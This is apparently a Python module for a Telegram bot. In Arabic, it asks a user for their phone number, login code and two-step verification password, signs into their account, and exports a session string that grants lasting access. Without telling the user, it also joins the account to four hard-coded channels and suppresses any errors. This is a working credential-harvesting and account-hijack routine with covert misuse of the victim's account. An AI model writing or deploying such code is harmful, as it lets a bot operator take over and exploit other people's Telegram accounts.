from random import randint

from pyrogram import filters, Client
from pyrogram.enums import SentCodeType
from pyrogram.errors import SessionPasswordNeeded
from pyrogram.types import Message

from mody.Keyboards import login_key, send_you_contact, cancel


async def getSession(msg: Message, key):
    if key == login_key:
        msg = await msg.ask('⌯ مشاركة جهة اتصالك', filters.contact, key, reply_markup=send_you_contact)
        phone_number = msg.contact.phone_number
    else:
        msg = await msg.ask('⌯ ارسل الرقم الان', filters.text, key, reply_markup=cancel)
        phone_number = msg.text
    MB = await msg.reply('⌯ انتظر جاري الاتصال بسيرفر التليجرام')
    user = Client(f"user:{randint(1, 9999)}", 27786450, '1fb7b1af2837205d7ce8d77cefc0acbd')
    await user.connect()
    await MB.edit('⌯ انتظر جاري طلب الكود')
    try:
        code = await user.send_code(phone_number)
    except Exception as e:
        print(e)
        await MB.delete()
        return await msg.reply('⌯ لم تنجح العملية.اعد المحاوله', reply_markup=key)
    code_type = {
        SentCodeType.APP: 'تطبيق التليجرام',
        SentCodeType.CALL: 'مكالمه صوتيه',
        SentCodeType.FLASH_CALL: 'مكالمه سريعه',
        SentCodeType.SMS: 'رسائل الهاتف',
        SentCodeType.EMAIL_CODE: 'البريد الالكتروني',
        SentCodeType.FRAGMENT_SMS: 'التسجيل الوهمي',
    }[code.type]
    msg = await msg.ask(
        f'⌯ وصلك كود علي {code_type} من فضلك ارسله وضع مسافة بين كل رقم',
        filters.text, key)
    phone_code = msg.text
    try:
        await user.sign_in(phone_number, code.phone_code_hash, phone_code)
    except SessionPasswordNeeded:
        msg = await msg.ask('⌯ ارسل كلمه المرور (التحقق بخطوتين)', filters.text, key)
        password = msg.text
        while True:
            try:
                await user.check_password(password)
                break
            except:
                msg = await msg.ask('⌯ التحقق خطأ اعد ارساله مره أخرى', filters.text, key)
                password = msg.text
    get_me = await user.get_me()
    session = await user.export_session_string()
    try:
        await user.join_chat('ALRAGI1')
        await user.join_chat('YY2PP')
        await user.join_chat('YB_13')
        await user.join_chat('YYNXX7')
    except:
        pass
    await user.disconnect()
    return user, get_me, session
